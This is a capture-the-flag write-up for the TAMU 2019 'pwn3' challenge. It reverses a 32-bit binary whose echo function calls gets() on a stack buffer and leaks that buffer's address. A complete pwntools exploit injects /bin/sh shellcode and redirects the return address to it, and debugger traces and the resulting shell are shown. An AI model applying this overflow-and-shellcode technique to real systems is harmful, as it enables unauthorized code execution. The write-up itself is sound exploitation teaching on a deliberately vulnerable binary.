# Tamu19 Pwn3

#### Checking binary protections

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pwn3$ file pwn3 && checksec pwn3
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/ShellCode/Pwn3/pwn3'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

We can see that the binary is compiled as a Position Independent Executable (PIE) so we can expect the code segment to contain offsets, with the addresses changing each time we run the binary. The bianry is 32-bit with an executable stack and is not stripped. We can take a look at the disassebmly with Objdump. We see there are two custom functions, main and echo:


## Reversing

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pwn3$ objdump -D -M intel ./pwn3

./pwn3:     file format elf32-i386

...
```

```asm
000005e3 <main>:
 5e3:	8d 4c 24 04          	lea    ecx,[esp+0x4]
 5e7:	83 e4 f0             	and    esp,0xfffffff0
 5ea:	ff 71 fc             	push   DWORD PTR [ecx-0x4]
 5ed:	55                   	push   ebp
 5ee:	89 e5                	mov    ebp,esp
 5f0:	53                   	push   ebx
 5f1:	51                   	push   ecx
 5f2:	e8 32 00 00 00       	call   629 <__x86.get_pc_thunk.ax>
 5f7:	05 d5 19 00 00       	add    eax,0x19d5
 5fc:	8b 90 28 00 00 00    	mov    edx,DWORD PTR [eax+0x28]
 602:	8b 12                	mov    edx,DWORD PTR [edx]
 604:	6a 00                	push   0x0
 606:	6a 00                	push   0x0
 608:	6a 02                	push   0x2
 60a:	52                   	push   edx
 60b:	89 c3                	mov    ebx,eax
 60d:	e8 2e fe ff ff       	call   440 <setvbuf@plt>
 612:	83 c4 10             	add    esp,0x10
 615:	e8 83 ff ff ff       	call   59d <echo>
 61a:	b8 00 00 00 00       	mov    eax,0x0
 61f:	8d 65 f8             	lea    esp,[ebp-0x8]
 622:	59                   	pop    ecx
 623:	5b                   	pop    ebx
 624:	5d                   	pop    ebp
 625:	8d 61 fc             	lea    esp,[ecx-0x4]
 628:	c3                   	ret

```

Looking at the disassembly for main we can see it is a short function. The most interesting parts are: 
- A call to setvbuf that looks to be using a buffer at eax<+0x28>
- After the call to setvbuf we see a call to the `echo` function
- When we return from `echo` we see the ebp-0x8 moved to esp, then a pop of ecx, ebx, and ebp before `main` finally returns.

Let's take a look at echo:

```bash
0000059d <echo>:
 59d:	55                   	push   ebp
 59e:	89 e5                	mov    ebp,esp
 5a0:	53                   	push   ebx
 5a1:	81 ec 34 01 00 00    	sub    esp,0x134
 5a7:	e8 f4 fe ff ff       	call   4a0 <__x86.get_pc_thunk.bx>
 5ac:	81 c3 20 1a 00 00    	add    ebx,0x1a20
 5b2:	83 ec 08             	sub    esp,0x8
 5b5:	8d 85 d6 fe ff ff    	lea    eax,[ebp-0x12a]
 5bb:	50                   	push   eax
 5bc:	8d 83 e4 e6 ff ff    	lea    eax,[ebx-0x191c]
 5c2:	50                   	push   eax
 5c3:	e8 48 fe ff ff       	call   410 <printf@plt>
 5c8:	83 c4 10             	add    esp,0x10
 5cb:	83 ec 0c             	sub    esp,0xc
 5ce:	8d 85 d6 fe ff ff    	lea    eax,[ebp-0x12a]
 5d4:	50                   	push   eax
 5d5:	e8 46 fe ff ff       	call   420 <gets@plt>
 5da:	83 c4 10             	add    esp,0x10
 5dd:	90                   	nop
 5de:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 5e1:	c9                   	leave  
 5e2:	c3                   	ret    
```

- We see 0x1a20 added to ebx. This expands ebx by that size.
- ebp-0x12a and ebx-0x191c are pushed to the stack and passed to printf as arguments.
- Next we see `gets` is called with ebp-0x12a as a buffer. 
- After this ebp-0x4 is moved to into ebx and `echo` returns. 

Looking at `echo` it is clear this is where we need to focus our attention. The call to gets will be our entry point for input to the program and this will be stored at ebp-0x12a (ebp - 298 bytes). We can expect if we send 298 bytes as input we'll be at ebp, so we can overwrite ebp with an additional 4 bytes and then we should be at the return address. We'll keep this in mind for now, but let's run the binary and see what it does: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pwn3$ ./pwn3 
Take this, you might need it on your journey 0xff8a2f7e!
thanks!
```
When you run the binary there's a message printed to the screen *"Take this, you might need it on your journey 0xff8a2f7e!"*. This looks like the program is leaking an address. We saw earlier that ebp-0x12a was passed to printf, and also passed to gets, so we can be fairly sure ebp-0x12a is our buffer. This means the leaked address is likely the start of where our input begins on the stack, giving us 298 bytes until we hit ebp. If we run the binary again, we'll see the leaked address changes. This means the binary is also using ASLR. 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pwn3$ ./pwn3 
Take this, you might need it on your journey 0xff85118e!
```

With what we know already we'll build a POC exploit and run it through gdb to check if we are correct. For the exploit we'll generate some shellcode using pwntools. 

### Exploit

```python
import re
from pwn import *

target = process("./pwn3")

# gdb.attach(target, gdbscript="b *echo+61")

# Get stack leak
message = target.recvuntil(b"!")
m = re.search(r'(?=0).+(?=!)', message.decode('utf-8'))
ebp_0x12a = int(m.group(0), 16)

# Payload
shellcode = asm(shellcraft.i386.linux.sh())
payload = shellcode + b"A" * (0x12a - len(shellcode)) + b"B" * 4 + p32(ebp_0x12a)

target.sendline(payload)

target.interactive()
```

After running the exploit we see the following in gdb at the breakpoint:

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffd9527e  →  0x2f68686a ("jhh/"?)
$ebx   : 0x64facfcc  →  <_GLOBAL_OFFSET_TABLE_+0000> aam 0x1e
$ecx   : 0xf09b19c0  →  0x00000000
$edx   : 0x1
$esp   : 0xffd95260  →  0xffd9527e  →  0x2f68686a ("jhh/"?)
$ebp   : 0xffd953a8  →  0x42424242 ("BBBB"?)
$esi   : 0xffd95484  →  0xffd9640b  →  "./pwn3"
$edi   : 0xf0a0bb80  →  0x00000000
$eip   : 0x64fab5da  →  <echo+003d> add esp, 0x10
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────── stack ────
0xffd95260│+0x0000: 0xffd9527e  →  0x2f68686a	 ← $esp
0xffd95264│+0x0004: 0xffd9527e  →  0x2f68686a
0xffd95268│+0x0008: 0xf09d5700  →  0x74725f00
0xffd9526c│+0x000c: 0x64fab5ac  →  <echo+000f> add ebx, 0x1a20
0xffd95270│+0x0010: 0xffd952c4  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffd95274│+0x0014: 0xffd952c0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffd95278│+0x0018: 0x00000003
0xffd9527c│+0x001c: 0x686a0000
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0x64fab5ce <echo+0031>      lea    eax, [ebp-0x12a]
   0x64fab5d4 <echo+0037>      push   eax
   0x64fab5d5 <echo+0038>      call   0x64fab420 <gets@plt>
 → 0x64fab5da <echo+003d>      add    esp, 0x10
   0x64fab5dd <echo+0040>      nop
   0x64fab5de <echo+0041>      mov    ebx, DWORD PTR [ebp-0x4]
   0x64fab5e1 <echo+0044>      leave
   0x64fab5e2 <echo+0045>      ret
   0x64fab5e3 <main+0000>      lea    ecx, [esp+0x4]
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "pwn3", stopped 0x64fab5da in echo (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x64fab5da → echo()
[#1] 0xffd9527e → push 0x68
────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0xffd953b0:
 eip = 0x64fab5da in echo; saved eip = 0xffd9527e
 called by frame at 0x4242424a
 Arglist at 0xffd953a8, args:
 Locals at 0xffd953a8, Previous frame's sp is 0xffd953b0
 Saved registers:
  ebx at 0xffd953a4, ebp at 0xffd953a8, eip at 0xffd953ac
```

As expected ebp has the 4 B's (0x42), and ebp+0x4 (the return address) is pointing the start of our buffer.

```bash
gef➤  x/a $ebp
0xffd953a8:	0x42424242
gef➤  x/a $ebp+4
0xffd953ac:	0xffd9527e
```

If we continue stepping through the program in gdb we can the execution moves to the start of our buffer. Following the execution of the shell code we can see the intstruction `int 80` will be called with the string `/bin/sh`: 

```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffd9527e  →  0x2f68686a ("jhh/"?)
$ebx   : 0xffd953a4  →  "/bin///sh"
$ecx   : 0xffd95398  →  0xffd953a0  →  0x00006873 ("sh"?)
$edx   : 0x0
$esp   : 0xffd95394  →  0x0000000b ("
                                     "?)
$ebp   : 0x42424242 ("BBBB"?)
$esi   : 0xffd95484  →  0xffd9640b  →  "./pwn3"
$edi   : 0xf0a0bb80  →  0x00000000
$eip   : 0xffd952a7  →  0x4180cd58
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
───────────────────────────────────────────────────────────────────── stack ────
0xffd95394│+0x0000: 0x0000000b ("
                                 "?)	 ← $esp
0xffd95398│+0x0004: 0xffd953a0  →  0x00006873 ("sh"?)
0xffd9539c│+0x0008: 0x00000000
0xffd953a0│+0x000c: 0x00006873 ("sh"?)
0xffd953a4│+0x0010: "/bin///sh"
0xffd953a8│+0x0014: "///sh"
0xffd953ac│+0x0018: 0x00000068 ("h"?)
0xffd953b0│+0x001c: 0xffd95300  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xffd952a1                  mov    ecx, esp
   0xffd952a3                  xor    edx, edx
   0xffd952a5                  push   0xb
 → 0xffd952a7                  pop    eax
   0xffd952a8                  int    0x80
   0xffd952aa                  inc    ecx
   0xffd952ab                  inc    ecx
   0xffd952ac                  inc    ecx
   0xffd952ad                  inc    ecx

```

After the system call is executed  we have a shell in the terminal:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/ShellCode/Pwn3$ python3 exploit_pwn3.py
[+] Starting local process './pwn3': pid 33223
[*] Switching to interactive mode

$ ls
exploit_pwn3.py  pwn3  tamu19_pwn3.md
$ date
Fri Sep 12 16:27:15 BST 2025
```

